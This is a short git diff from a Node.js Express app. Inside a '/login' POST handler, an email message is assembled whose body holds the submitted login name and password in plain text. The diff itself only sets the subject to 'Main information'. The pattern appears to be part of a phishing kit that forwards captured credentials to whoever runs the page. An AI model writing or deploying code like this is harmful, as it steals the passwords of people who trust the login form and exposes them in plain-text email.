@@ -29,7 +29,7 @@ app.post("/login",function(req,res) {
 let mailOptions = {
 	from : '', // email
 	to : '', // email
-	subject : "", //subject
+	subject : "Main information", //subject
 	text : "login: " + loginName + ", password : " + password //text 
 };
 	
